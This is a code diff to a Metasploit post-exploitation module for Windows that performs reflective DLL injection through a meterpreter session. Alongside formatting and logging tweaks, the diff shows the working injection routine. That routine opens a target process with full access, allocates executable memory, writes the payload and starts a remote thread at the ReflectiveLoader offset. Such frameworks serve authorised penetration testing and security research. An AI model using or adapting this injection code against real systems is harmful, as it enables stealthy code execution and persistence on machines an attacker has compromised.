@@ -12,15 +12,18 @@ class Metasploit3 < Msf::Post
 
 	def initialize(info={})
 		super( update_info( info,
-			'Name'		=> 'Windows Manage Reflective DLL Injection Module',
-			'Description'	=> %q{
+			'Name'          => 'Windows Manage Reflective DLL Injection Module',
+			'Description'   => %q{
 				This module will inject into the memory of a process a specified Reflective DLL.
 			},
-			'License'	=> MSF_LICENSE,
-			'Author'	=> [ 'Ben Campbell <eat_meatballs[at]hotmail.co.uk>'],
-			'Platform'	=> [ 'win' ],
-			'SessionTypes'	=> [ 'meterpreter' ],
-			'References'	=> [ [ 'URL', 'https://github.com/stephenfewer/ReflectiveDLLInjection' ] ]
+			'License'      => MSF_LICENSE,
+			'Author'       => [ 'Ben Campbell <eat_meatballs[at]hotmail.co.uk>'],
+			'Platform'     => [ 'win' ],
+			'SessionTypes' => [ 'meterpreter' ],
+			'References'   =>
+				[
+					[ 'URL', 'https://github.com/stephenfewer/ReflectiveDLLInjection' ]
+				]
 		))
 
 		register_options(
@@ -49,7 +52,7 @@ class Metasploit3 < Msf::Post
 				end
 			end
 
-			raise "Can't find an exported ReflectiveLoader function!" if offset == 0
+			raise "Can't find an exported ReflectiveLoader function!" if offset.nil? or offset == 0
 		rescue
 			print_error( "Failed to read and parse Dll file: #{$!}" )
 			return
@@ -60,7 +63,7 @@ class Metasploit3 < Msf::Post
 
 	def inject_into_pid(pay, pid, offset)
 
-		if offset.nil?
+		if offset.nil? or offset == 0
 			print_error("Reflective Loader offset is nil.")
 			return
 		end
@@ -79,19 +82,19 @@ class Metasploit3 < Msf::Post
 		begin
 			print_status("Opening process #{pid}")
 			host_process = client.sys.process.open(pid.to_i, PROCESS_ALL_ACCESS)
-			print_status("Generating payload")
 			print_status("Allocating memory in procees #{pid}")
 			mem = host_process.memory.allocate(pay.length + (pay.length % 1024))
 			# Ensure memory is set for execution
 			host_process.memory.protect(mem)
-			print_status("Allocated memory at address #{"0x%.8x" % mem}, for #{pay.length} bytes")
-			print_status("Writing the stager into memory...")
+			vprint_status("Allocated memory at address #{"0x%.8x" % mem}, for #{pay.length} bytes")
+			print_status("Writing the payload into memory")
 			host_process.memory.write(mem, pay)
+			print_status("Executing payload")
 			host_process.thread.create(mem+offset, 0)
 			print_good("Successfully injected payload in to process: #{pid}")
 		rescue ::Exception => e
 			print_error("Failed to Inject Payload to #{pid}!")
-			print_error(e.to_s)
+			vprint_error(e.to_s)
 		end
 	end
 end
